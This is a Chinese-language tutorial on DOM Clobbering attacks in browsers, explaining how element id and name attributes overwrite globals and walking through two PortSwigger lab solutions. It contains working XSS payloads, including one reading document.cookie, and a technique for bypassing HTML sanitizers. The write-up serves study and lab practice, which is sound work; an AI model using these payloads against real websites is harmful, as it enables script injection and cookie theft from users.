作者：L's 合天智汇

### 前言  

最近看到好多师傅都已经学习过了DOM Clobbering Attack，因此自己也来学习一波。

### 0x01 简介  

DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM
Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属性或全局变量，或者劫持一些变量的内容。

测试环境 Chrome 80.0.3987.132

### 0x02 简单的例子：  

1.对象创建

测试代码如下：

    
    
    <!DOCTYPE html><html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>DOM Clobbering Attack</title>
    </head>
    <body>
    <form id=test1></form>
    <form name=test2></form>
    <script>
        console.log(test1);
        console.log(test2);
        console.log(window.test1);
        console.log(window.test2);
        console.log(document.test1);
        console.log(document.test2);
    </script>
    </body>
    </html>

打印的结果如下：

![v2-a6b70751d2e69ee8d248f2ab01731fc4_720w](https://pic2.zhimg.com/80/v2-a6b70751d2e69ee8d248f2ab01731fc4_720w.png)

通过上面的结果，可以看出来HTML标签中的id属性值被当做全局变量，name属性值被当成document的属性，这也就是为什么上面有一行输出undefined的原因。

2.方法的覆盖

测试代码如下：

    
    
    <!DOCTYPE html><html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>DOM Clobbering Attack</title>
    </head>
    <body>
    <form name="getElementById"></form>
    <form id="form"></form>
    <script>
        console.log(document.getElementById);
        console.log(document.getElementById("form"))
    </script>
    </body>
    </html>

结果如下：

![v2-589c0cf2dc744c44bb8c6ade551bb1c1_720w](https://pic2.zhimg.com/80/v2-589c0cf2dc744c44bb8c6ade551bb1c1_720w.png)

通过上面的输出结果显示我们可以通过name属性覆盖document中的内置方法。

3.通过标签的层级关系构造变量的层级关系

测试代码如下：

    
    
    <!DOCTYPE html><html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>DOM Clobbering Attack</title>
    </head>
    <body>
    <form id="test1">
        <input id="test2">
        <img id="test3">
    </form>
    <form id="test4" name="test5"></form>
    <form name="body">
        <input name="firstChild">
    </form>
    <script>
        console.log(test1);
        console.log(test1.test2);
        console.log(test1.test3);
        console.log(test4['name']);
        console.log(test5['id']);
        console.log(document.body);
        console.log(document.body.firstChild);
    </script>
    </body>
    </html>

结果如下：

![v2-442206bfee17ff657633bbd4380aedf8_720w](https://pic2.zhimg.com/80/v2-442206bfee17ff657633bbd4380aedf8_720w.png)

通过上面的结果我们看到，可以通过多层覆盖的方式，覆盖Window和document下的对象。

### 0x03 javascript Scope  

由于DOM Clobbering Attack的攻击中有很多的地方用到了javascript的作用域链，因此我们可以来了解一下：

1.全局作用域：

在javascript中全局作用域一般是window(nodejs是global)。

2.显示声明：

    
    
    <!DOCTYPE html><html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>DOM Clobbering Attack</title>
    </head>
    <body>
    <script>
        var testValue=123;
        var testFunc=function () {
            console.log("DOM");
        };
        console.log(window.testValue); // 123
        console.log(window.testFunc); // function(){console.log("DOM")}
    </script>
    </body>
    </html>

3.隐式声明：

不带有声明关键字的变量，js会默认帮你声明一个全局变量：

    
    
    <!DOCTYPE html><html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>DOM Clobbering Attack</title>
    </head>
    <body>
    <script>
        function foo(value) {
            result=value+1;
            return result;
        }
        foo(1);
        console.log(window.result); // 2
    </script>
    </body>
    </html>

变量result被挂载到了window对象上了。

4.块级作用域：

在 ES6 之前，是没有块级作用域的概念的。如果你有 C++ 或者 Java 经验，想必你对块级作用域并不陌生：

    
    
    for (var i=0;i<5;i++){}
    console.log(i); // 5

从上面的结果来看，说明var声明的变量，在for循环之后仍然保存在这个作用域里，而for(){}仍然在全局作用域里，因此var声明的变量在全局作用域里。

我们可以通过let(或const用来声明常量)来声明变量，实现块级作用域。

除了上面的几种作用域外还有语法作用域，动态作用域等，就不赘述了感兴趣的参考下面的链接。

### 0x04 攻击方法：  

1.为了分析DOM Clobbering漏洞，假设如下代码：

    
    
    if (window.test1.test2) {
        eval(''+window.test1.test2)
    }

如果我们想利用Dom Clobbering技巧来执行任意的js，需要解决两个问题：

1)利用html标签的属性id，很容易在window对象上创建任意的属性，但是我们能在新对象上创建新属性吗？

2)怎么控制DOM elements被强制转为string之后的值，大多数的dom节点被转为string后是[object
HTMLInputElement]。

我们可以用前面的例子来解决第一个问题：

    
    
    <!DOCTYPE html><html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>DOM Clobbering Attack</title>
    </head>
    <body>
    <form id="test1">
        <input name="test2">
    </form>
    <script>
        console.log(test1.test2.toString()); // [object HTMLInputElement]
    </script>
    </body>
    </html>

我们可以用下面的一段代码来枚举，html存在的所有标签，然后检查其dom节点对象有没有实现toString方法，或者是继承于Object.ptototype。如果是继承自Object.prototype,那么很有可能只会返回[object
SomeElement]

    
    
    Object.getOwnPropertyNames(window).filter(p => p.match(/Element$/))
    .map(p => window[p])
    .filter(p => p && p.prototype && p.prototype.toString !== Object.prototype.toString)

我们可以得到两个对象:HTMLAreaElement (<area>)和HTMLAnchorElement
(<a>)，这两个标签的toString会直接返回他的href属性。

    
    
    <!DOCTYPE html><html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>DOM Clobbering Attack</title>
    </head>
    <body>
    <a id=test1 href=https://www.baidu.com>
        <script>
            console.log(test1.toString()); // https://www.baidu.com
        </script>
    </body>
    </html>

结合上面的两个问题，我们会构造如下payload:

    
    
    <form id=test1>
      <a name=test2 href="x:alert(1)"></a>
    </form>

但是test1.test2是undefined，这是因为<input>元素会变成<form>的属性，但<a>标签并不会。

    
    
    <form id=test1>
        <a name=test2 href="x:alert(1)"></a>
    </form>
    <body>
    <script>
        console.log(test1.test2); // undefined
    </script>

我们可以通过构造一个HTMLCollection来解决问题，例如：

    
    
    <a id="test1">click1!</a><a id="test1">click2!</a>
    <body>
    <script>
        console.log(test1)
    </script>

返回的**如下所示：

    
    
    HTMLCollection(2) [a#test1, a#test1, test1: a#test1]
    length: 2
    0: a#test1
    1: a#test1
    test1: a#test1
    __proto__: HTMLCollection

HTMLCollection可以通过index访问，同时可以使用id访问，并且可以使用name访问，例如：

    
    
    <a id="test1">click1!</a><a id="test1" name="test2">click2!</a>
    <body>
    <script>
        console.log(test1.test2); //<a id="test1" name="test2">click2!</a>
    </script>

因此上面的问题得到解决，通过构造如下payload:

    
    
    <a id="test1"></a><a id="test1" name="test2" href="jacascript:alert(1)"></a> 
    <a id="test1"></a><a id="test1" name="test2" href="javascript:alert(1)"></a><script>
        if (window.test1.test2) {
            eval(''+window.test1.test2)
        }
    </script>

成功执行。

2.确定DOM元素间的关系

我们把两个HTML元素相邻放置，分别为其分配一个ID，然后检查第一个元素是否具有第二个元素的属性。代码如下：

    
    
    const log = [];
        const html = ["a", "abbr", "acronym", "address", "applet", "area", "article", "aside", "audio", "b", "base", "basefont", "bdi", "bdo", "bgsound", "big", "blink", "blockquote", "body", "br", "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "command", "content", "data", "datalist", "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "element", "em", "embed", "fieldset", "figcaption", "figure", "font", "footer", "form", "frame", "frameset", "h1", "head", "header", "hgroup", "hr", "html", "i", "iframe", "image", "img", "input", "ins", "isindex", "kbd", "keygen", "label", "legend", "li", "link", "listing", "main", "map", "mark", "marquee", "menu", "menuitem", "meta", "meter", "multicol", "nav", "nextid", "nobr", "noembed", "noframes", "noscript", "object", "ol", "optgroup", "option", "output", "p", "param", "picture", "plaintext", "pre", "progress", "q", "rb", "rp", "rt", "rtc", "ruby", "s", "samp", "script", "section", "select", "shadow", "slot", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "svg", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "title", "tr", "track", "tt", "u", "ul", "var", "video", "wbr", "xmp"];
        div=document.createElement('div');
        for(let i=0; i<html.length; i++) {
            for(let j=0; j<html.length; j++) {
                div.innerHTML='<'+html[i]+' id=element1>'+'<'+html[j]+' id=element2>';
                document.body.appendChild(div);
                if(window.element1 && element1.element2){
                    log.push(html[i]+','+html[j]);
                }
                document.body.removeChild(div);
            }
        }
        console.log(log.join('\n'));

上面是我们用html标签的id属性来寻找DOM之间的关系的过程，结果如下：

    
    
    form,button
    form,fieldset
    form,image
    form,img
    form,input
    form,object
    form,output
    form,select
    form,textarea

如果我们要覆盖一个对象的x.y.value值，可以用下面的这种方式：

    
    
    <form id=x><output id=y>I've been clobbered</output></form><script>
        console.log(x.y.value);
    </script>

3.使用form标签来伪造三层的对象引用

    
    
    <form id=x name=y><input id=z></form><form id=x></form>
    <script>
        alert(x.y.z)
    </script>

在Chrome中，当form标签有两个一样的id的input标签时，Chrome会将其处理为[object
RadioNodeList]，这个可以用forEach来遍历：

    
    
    <form id=x>
        <input id=y name=z>
        <input id=y>
    </form>
    <script>
        x.y.forEach(element=>alert(element));
    </script>

4.是否自定义的DOM节点也具有上面的属性呢？

    
    
    <form id=x y="123"></form><script>
        alert(x.y); // undefined
    </script>

我们可以通过下面的代码来测试一下dom中有哪些属性可以用：

    
    
    var html = ["a","abbr","acronym","address","applet","area","article","aside","audio","b","base","basefont","bdi","bdo","bgsound","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","image","img","input","ins","isindex","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","wbr","xmp"];//HTML elements arrayvar props=[];
    for(i=0;i<html.length;i++){
      obj = document.createElement(html[i]);
       for(prop in obj) {
        if(typeof obj[prop] === 'string') {
          try {
            props.push(html[i]+':'+prop);
          }catch(e){}
        }
       }
    }
    console.log([...new Set(props)].join('\n'));

上面的代码显示的是string类型的属性，他们并不一定可控，为了检查他们是否可读写，我们可以用下面的代码：

    
    
    var html = [...]//HTML elements arrayvar props=[];
    for(i=0;i<html.length;i++){
        obj = document.createElement(html[i]);
        for(prop in obj) {
            if(typeof obj[prop] === 'string') {
                try {
                    DOM.innerHTML = '<'+html[i]+' id=x '+prop+'=1>';
                    if(document.getElementById('x')[prop] == 1) {
                        props.push(html[i]+':'+prop);
                    }
                }catch(e){}
            }
        }
    }
    console.log([...new Set(props)].join('\n'));

通过上面的输出结果可以有：

    
    
    <a id="x" target="ddd"></a><a id="y" download="eee"></a>
    ...
    <script>
        console.log(x.target); // ddd
        console.log(y.download); // eee
    </script>

对于上面的DOM属性中，我们需要关注的是username和password属性，他们是a标签的节点属性并不是html中定义的属性，这两个属性可以通过url的中的username字段和password字段提供，但是需要有@符号：

    
    
    <a id=x href="ftp:Clobbered-username:Clobbered-Password@a"></a><script>     
        console.log(x.username); //Clobbered-username
        console.log(x.password); //Clobbered-password
    </script>

上面不仅可以用ftp协议，也可以用http协议(必须加//)，需要注意的是，如果我们直接通过toString函数将dom转换为字符串他的href是经过url编码的，不过我们可以通过一个不存在的协议绕过abc:<>：

    
    
    <a id=x href="abc:<>"></a><script>     
        alert(x); //abc:<>
    </script>

5.获取3级以上的对象引用

[@Terjanq](https://twitter.com/terjanq)提到，可以结合iframe的srcdoc属性构造任意层数的对象引用。

例子如下：

    
    
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
    <script>setTimeout(()=>alert(a.b.c.d),500)</script>

上面用到了setTimeout设置一个定时器是为了保证iframe框架的加载完成。我们可以利用style/link来加载外部样式表来造成延迟：

    
    
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>
    <script>
    alert(a.b.c.d)
    </script>

### 0x06 攻击实例：  

1.[clobbering to enable XSS lab](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)

实验之前先看一个简单的例子：

    
    
    <a id=someObject><a id=someObject name=url href="./xss.js"> <!--xss.js alert(1)--><script>
        window.onload = function(){
            let someObject = window.someObject || {};
            let script = document.createElement('script');
            script.src = someObject.url;
            document.body.appendChild(script);
        };
    </script>

这个实验就有点类似下面这个例子：

通过查看源代码我们可以看到这个文件：[loadCommentsWithDomClobbering.js](https://ac8c1f921ebb103480b5163d00e00082.web-security-academy.net/resources/js/loadCommentsWithDomClobbering.js)，我们可以看到下面的获取图片src的代码：

    
    
    let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
    let divImgContainer = document.createElement("div");
    divImgContainer.innerHTML = avatarImgHTML

avatar的默认值是/resources/images/avatarDefault.svg，我们可以通过覆盖window.defaultAvatar来实现xss，构造的payload如下：

    
    
    <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&ampquotonerror=alert(1)//">

插入的标签如下：

    
    
    <p><a id="defaultAvatar"></a>
    <a href="cid:&ampquotonerror=alert(1)//" name="avatar" id="defaultAvatar"></a>
    </p>

为什么我们要把闭合前面的"编码为&ampquot，因为cid是没有这个协议的，因此不会对"进行url编码。这样在解码时&ampquot就变成了控制字符"改变页面结构。

然后再评论一次，刷新全局变量，加载loadCommentsWithDomClobbering.js即可导致xss。

![v2-8417c6d7f341713f5a9f4e0bdcbfe208_720w](https://pic2.zhimg.com/80/v2-8417c6d7f341713f5a9f4e0bdcbfe208_720w.png)

2.[Clobbering attributes lab](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

实验之前我们先来看一个例子：

    
    
    <!DOCTYPE html><html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>DOM Clobbering Attack</title>
    </head>
    <body>
    <html>
    <body>
    <!-- 表单，用于提交payload -->
    <form action="" id="form1">
        <input type="text" name="payload" style="width: 500px;height:60px;"><br>
        <input type="button" onclick=formSubmit() value="submit">
    </form>
    </body>
    </html>
    <script>
        // 遍历DOM树，不需要关注这个函数
        function DomBFS(element, callback) {
            var queue = [];
            while(element) {
                callback(element);
                if(element.children.length !== 0) {
                    for (var i = 0; i < element.children.length; i++) {
                        queue.push(element.children[i]);
                    }
                }
                element = queue.shift();
            }
        }
    
        // 过滤用户提交的HTML代码，如果包含onclick, onerror，删掉该属性(attribute)
        let blockAttributes = ["onclick", "onerror"];
        function formSubmit() {
            let f = document.getElementById("form1");
            let sandbox = document.implementation.createHTMLDocument('');
            let root = sandbox.createElement("div");
            root.innerHTML = f.payload.value;
    
            DomBFS(root, function(element){
                // 遍历属性名
                for(var a = 0; a < element.attributes.length; a+=1) {
                    let attr = element.attributes[a];
                    if(blockAttributes.indexOf(attr.name) != -1) {
                        element.removeAttribute(attr.name);
                        a -= 1;
                    }
                }
            });
            document.body.appendChild(root);
        }
    </script>
    </body>
    </html>

payload如下：

    
    
    <form onclick=alert(1)><input id=attributes>Click me

由于attributes被覆盖导致执行到payload的form时跳过for循环跳过黑名单，成功执行xss。

跟上面一样我们先看看[loadCommentsWithHtmlJanitor.js](https://ac881f5f1f7c651280861b7b00860012.web-security-academy.net/resources/js/loadCommentsWithHtmlJanitor.js)的代码。

    
    
    // Sanitize attributesfor (var a = 0; a < node.attributes.length; a += 1) {
        var attr = node.attributes[a];
    
        if (shouldRejectAttr(attr, allowedAttrs, node)) {
            node.removeAttribute(attr.name);
            // Shift the array to continue looping.
            a = a - 1;
        }
    }

结合上面的例子我们可以通过构造<form id=x><input id=attributes>的形式来绕过。

根据题目的要求，需要访问触发，并且通过参考资料得知利用tabindex属性和form的onfocus来执行xss。

因此构造如下：

    
    
    <form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes>

![v2-e24b5de6f56ca6b955d7d5ffcfd3e9b9_720w](https://pic1.zhimg.com/80/v2-e24b5de6f56ca6b955d7d5ffcfd3e9b9_720w.png)

但是我们要解决这个lab需要提交到该漏洞利用的漏洞服务器，而且用户直接点击是不会触发xss的，因此我们要构造一个在评论后主动访问并且加上#x，为了等待评论完成我们需要延迟一下，因此构造下面的payload:

    
    
    <iframe src=https://ac5d1feb1e0464fb80aec03700a10012.web-security-academy.net/post?postId=2 onload="setTimeout(a=>this.src=this.src+'#x',500)"></iframe>

直接提交完成lab。

![v2-5ba4eee69fbe2526906c89b2c9d7c6b2_720w](https://pic4.zhimg.com/80/v2-5ba4eee69fbe2526906c89b2c9d7c6b2_720w.png)

### 0x07 总结  

现在一般可以xss的地方都会有过滤，因此当我们xss不了的时候我们是不是可以考虑一下DOM Clobbering Attack呢？

### 0x08  

参考链接

<http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/>

<https://juejin.im/post/5abb99e9f265da2392366824>

<https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/>

<https://portswigger.net/research/dom-clobbering-strikes-back>

<https://xz.aliyun.com/t/7346>

<https://portswigger.net/web-security/dom-based/dom-clobbering>

实验推荐：

WebGoat之XSS

<http://hetianlab.com/expc.do?ce=bda568d3-a31c-49ef-ba3e-a4c7d4ee1d0a>

（由于html和js都是解释执行的，如果对用户的输入过滤不够严格，导致用户输入一些html或者js代码被浏览器执行）

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

